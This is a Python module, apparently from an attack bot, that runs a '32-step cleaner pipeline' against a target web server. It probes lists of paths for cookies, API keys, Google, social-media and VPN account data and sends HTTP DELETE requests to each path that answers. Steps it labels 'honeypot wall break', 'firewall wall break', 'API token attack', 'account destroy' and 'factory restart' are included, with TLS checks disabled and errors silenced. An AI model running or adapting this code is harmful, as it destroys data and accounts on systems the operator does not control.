#!/usr/bin/env python3
"""apex_cleaner.py - 32-step cleaner pipeline + core cleaner"""
from apex_utils import (p_clean, p_ok, p_okay, p_pipe, p_err,
                        p_wall, p_fact, p_token)
from apex_config import (
    CLEANER_HTTP_PATHS, CLEANER_HTTPS_PATHS, CLEANER_ANOTHER_PATHS,
    CLEANER_COOKIES_DATA_PATHS, CLEANER_ALL_COOKIES_PATHS,
    CLEANER_COMPLETE_DATA_PATHS, CLEANER_MOVIE_PATHS, CLEANER_VIDEO_PATHS,
    CLEANER_STREAMING_PATHS, CLEANER_IMAGE_PATHS, CLEANER_LANGUAGE_PATHS,
    CLEANER_SYSTEM_PATHS, SERIES_CLEANER_PATHS,
    GWS_CLEANER_PATHS, ESF_CLEANER_PATHS,
    APIKEY_CLEANER_PATHS, COOLDOWN_CLEANER_PATHS,
    GOOGLE_ACCOUNT_CLEANER_PATHS, GOOGLE_SUSPICIOUS_SERVER_PATHS,
    SOCIAL_CLEANER_PATHS, VPN_CLEANER_PATHS,
    HONEYPOT_WALL_PATTERNS, FIREWALL_WALL_PATTERNS,
    API_TOKEN_TARGETS, FACTORY_PATTERNS, ACCOUNT_ACTION_PATTERNS,
)


class CleanerCore:
    def __init__(self, bot):
        self.bot = bot

    # ---------- generic group cleaner ----------
    def clean_group(self, group_name, paths):
        cleaned = 0
        for path in paths:
            try:
                url = self.bot.base_url + path
                r = self.bot._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    try:
                        self.bot.session.delete(url, timeout=3, verify=False)
                    except Exception:
                        pass
                    cleaned += 1
                    self.bot.cleaner_stats['okay_signals'] += 1
                    p_okay(f"OKAY - CLEANED [{group_name}]: {path}")
            except Exception:
                pass
        return cleaned

    # ---------- 32-step pipeline ----------
    def run_32_step_pipeline(self):
        self.bot.cleaner_stats['pipeline_runs'] += 1
        print("\n=== FULL 32-STEP CLEANER PIPELINE ===")
        total = 0
        steps = [
            ('1/32  Honeypot wall break', self.break_honeypot_wall),
            ('2/32  Firewall wall break', self.break_firewall_wall),
            ('3/32  HTTP cookies', lambda: self.clean_group('http', CLEANER_HTTP_PATHS)),
            ('4/32  HTTPS cookies', lambda: self.clean_group('https', CLEANER_HTTPS_PATHS)),
            ('5/32  Another cookies', lambda: self.clean_group('another', CLEANER_ANOTHER_PATHS)),
            ('6/32  Cookies data', lambda: self.clean_group('cookies_data', CLEANER_COOKIES_DATA_PATHS)),
            ('7/32  All cookies', lambda: self.clean_group('all_cookies', CLEANER_ALL_COOKIES_PATHS)),
            ('8/32  Complete data', lambda: self.clean_group('complete_data', CLEANER_COMPLETE_DATA_PATHS)),
            ('9/32  Movie data', lambda: self.clean_group('movie', CLEANER_MOVIE_PATHS)),
            ('10/32 Video data', lambda: self.clean_group('video', CLEANER_VIDEO_PATHS)),
            ('11/32 Streaming data', lambda: self.clean_group('streaming', CLEANER_STREAMING_PATHS)),
            ('12/32 Image data', lambda: self.clean_group('image', CLEANER_IMAGE_PATHS)),
            ('13/32 Series data', lambda: self.clean_group('series', SERIES_CLEANER_PATHS)),
            ('14/32 Language data', lambda: self.clean_group('language', CLEANER_LANGUAGE_PATHS)),
            ('15/32 System data', lambda: self.clean_group('system', CLEANER_SYSTEM_PATHS)),
            ('16/32 GWS data', lambda: self.clean_group('gws', GWS_CLEANER_PATHS)),
            ('17/32 ESF data', lambda: self.clean_group('esf', ESF_CLEANER_PATHS)),
            ('18/32 API keys', lambda: self.clean_group('apikey', APIKEY_CLEANER_PATHS)),
            ('19/32 Cooldown data', lambda: self.clean_group('cooldown', COOLDOWN_CLEANER_PATHS)),
            ('20/32 Google Account data', lambda: self.clean_group('google_account', GOOGLE_ACCOUNT_CLEANER_PATHS)),
            ('21/32 Google Suspicious data', lambda: self.clean_group('google_suspicious', GOOGLE_SUSPICIOUS_SERVER_PATHS)),
            ('22/32 Social Suspicious data (Telegram/TikTok)', lambda: (
                self.clean_group('telegram', SOCIAL_CLEANER_PATHS['telegram']) +
                self.clean_group('tiktok', SOCIAL_CLEANER_PATHS['tiktok'])
            )),
            ('23/32 Social Suspicious data (Discord/Pinterest)', lambda: (
                self.clean_group('discord', SOCIAL_CLEANER_PATHS['discord']) +
                self.clean_group('pinterest', SOCIAL_CLEANER_PATHS['pinterest'])
            )),
            ('24/32 Social Suspicious data (WhatsApp/Facebook)', lambda: (
                self.clean_group('whatsapp', SOCIAL_CLEANER_PATHS['whatsapp']) +
                self.clean_group('facebook', SOCIAL_CLEANER_PATHS['facebook'])
            )),
            ('25/32 Social Suspicious data (Instagram/Twitter)', lambda: (
                self.clean_group('instagram', SOCIAL_CLEANER_PATHS['instagram']) +
                self.clean_group('twitter', SOCIAL_CLEANER_PATHS['twitter'])
            )),
            ('26/32 VPN - Free', lambda: self.bot.vpn.clean_freevpn_group()),
            ('27/32 VPN - Private', lambda: self.bot.vpn.clean_privatevpn_group()),
            ('28/32 VPN - Protocol', lambda: self.bot.vpn.clean_protocolvpn_group()),
            ('29/32 VPN tokens', lambda: self.bot.vpn.clean_vpn_tokens()),
            ('30/32 IP-Bypass', lambda: 1 if self.bot.ip_bypass() else 0),
            ('31/32 API tokens', self.api_token_attack),
            ('32/32 Account destroy + Factory restart', lambda: (
                self.account_action_destroyer() + self.factory_restart()
            )),
        ]
        for label, fn in steps:
            p_pipe(f"STEP {label}")
            try:
                total += fn()
            except Exception as e:
                p_err(f"Step failed: {e}")
        self.bot.cleaner_stats['total_cleaned'] += total
        p_ok(f"32-STEP CLEANER COMPLETE: {total} items")
        return total

    # ---------- destruction helpers ----------
    def api_token_attack(self):
        cleaned = 0
        for token_type, paths in API_TOKEN_TARGETS.items():
            for path in paths:
                try:
                    url = self.bot.base_url + path
                    r = self.bot._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200, 201, 202, 204, 301, 302, 403):
                        try:
                            self.bot.session.delete(url, timeout=3, verify=False)
                        except Exception:
                            pass
                        cleaned += 1
                        self.bot.cleaner_stats['okay_signals'] += 1
                        p_okay(f"OKAY - DESTROYED [{token_type}]: {path}")
                except Exception:
                    pass
        return cleaned

    def account_action_destroyer(self):
        destroyed = 0
        for path in ACCOUNT_ACTION_PATTERNS:
            try:
                url = self.bot.base_url + path
                r = self.bot._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 202, 204, 301, 302, 403):
                    try:
                        self.bot.session.delete(url, timeout=3, verify=False)
                    except Exception:
                        pass
                    destroyed += 1
                    self.bot.cleaner_stats['okay_signals'] += 1
                    p_okay(f"OKAY - ACCOUNT DESTROYED: {path}")
            except Exception:
                pass
        return destroyed

    def factory_restart(self):
        restarted = 0
        for path in FACTORY_PATTERNS:
            try:
                r = self.bot._request('GET', self.bot.base_url + path, timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 202, 204, 301, 302):
                    restarted += 1
                    self.bot.cleaner_stats['factory_restarted'] += 1
                    p_fact(f"FACTORY RESTART: {path}")
            except Exception:
                pass
        return restarted

    def break_honeypot_wall(self):
        broken = 0
        for path in HONEYPOT_WALL_PATTERNS:
            try:
                r = self.bot._request('GET', self.bot.base_url + path, timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 202, 204, 301, 302):
                    broken += 1
                    self.bot.cleaner_stats['honeypot_wall_broken'] += 1
                    p_wall(f"HONEYPOT WALL BROKEN: {path}")
            except Exception:
                pass
        return broken

    def break_firewall_wall(self):
        broken = 0
        for path in FIREWALL_WALL_PATTERNS:
            try:
                r = self.bot._request('GET', self.bot.base_url + path, timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 202, 204, 301, 302):
                    broken += 1
                    self.bot.cleaner_stats['firewall_wall_broken'] += 1
                    p_wall(f"FIREWALL WALL BROKEN: {path}")
            except Exception:
                pass
        return broken
